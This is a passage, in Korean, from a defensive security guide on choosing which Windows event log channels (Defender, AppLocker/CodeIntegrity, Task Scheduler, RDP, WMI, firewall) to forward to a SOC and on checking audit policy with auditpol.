    3. <strong>Defender/Operational</strong> — 탐지(1116/1117)와 변조(5001/5007/5013). 중앙 Defender 콘솔이 이미 SOC에 닿고 있지 않다면.
    4. <strong>CodeIntegrity/Operational, AppLocker, Security-Mitigations</strong> — App Control, AppLocker, 익스플로잇 보호를 쓰는 곳이라면 어디든. 차단이 경보가 되도록.
    5. <strong>TaskScheduler, TerminalServices, WMI-Activity, Bits-Client</strong> — 큰 셋만으로는 온전히 안 나오는 지속성과 RDP 증거.
    6. <strong>방화벽 필터.</strong> 그 사이트의 Windows 빌드에서 이 채널이 실제로 어떤 ID를 내는지 확인합니다. 최근 Windows 11 빌드는 규칙 변경에 다른 ID를 쓰니, 복사해 온 2004/2005/2006 필터는 아무것도 안 모을 수 있습니다. 감사 정책을 통한 Security 4946–4950도 고려합니다.

    마지막으로 표본 호스트에서 `auditpol`로 감사 정책 자체를 확인합니다. 필요한 하위 범주가 꺼져 있으면 Security를 모아도 소용이 없습니다.

## 관련 레퍼런스 { #related }

- [Windows 로그](index.md) — 이 섹션 개요
- [Windows 이벤트 로깅의 원리](how-event-logging-works.md) — 공급자, 채널, 로그가 지나가는 길, 감사 설정, 세 가지 보기
- [애플리케이션 제어, FIM, 지속성 잡기](../endpoint-defense/appcontrol-fim-persistence.md) — AppLocker와 CodeIntegrity 이벤트가 나오는 곳
- [Windows 이벤트 로그 (EVTX)](../../../windows/event-logs.md) · [Windows 이벤트 ID](../../../basics/windows-event-ids.md) · [PowerShell 다운로드 크래들](../../../adversary/powershell-cradles.md) · [방어 무력화와 로그 삭제](../../../adversary/impair-defenses-log-clearing.md)
